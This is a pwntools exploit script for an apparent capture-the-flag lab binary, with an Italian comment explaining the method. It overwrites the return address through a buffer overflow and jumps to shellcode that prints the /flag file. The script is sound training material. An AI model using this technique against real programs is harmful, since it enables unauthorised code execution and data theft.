#!/usr/bin/python3
from pwn import *

'''
-- OBIETTIVO DEL PROGRAMMA --
In questa challenge viene richiesto uno shellcode come input e viene fornito l'indirizzo dove quest'ultimo viene salvato.
Quindi l'obiettivo è generare uno shellcode che possa stampare la flag e portare il programma alla sua esecuzione
andando a sostituire il return address della funzione con l'indirizzo dove si trova lo shellcode. In questo modo,
quando la funzione challenge terminerà, andrà a eseguire lo shellcode. Per farlo è sufficiente conoscere la distanza
tra il buffer e il return address della funzione (con gdb) e inviare una stringa della giusta dimensione seguita
dell'indirizzo dove è stato salvato lo shellcode.
-----------------------------
'''

context.log_level = 'CRITICAL'
context.arch = 'amd64'

elf = ELF('/challenge/toddlerone-level-1-0')
p = elf.process()

assembly = shellcraft.cat('/flag')
shellcode = asm(assembly)

shellcode_addr = p64(0x28864000)

delta_len = 88
bytestream = b'A' * delta_len + shellcode_addr

p.sendline(shellcode)
p.sendline(f'{len(bytestream)}'.encode())
p.sendline(bytestream)
p.interactive()
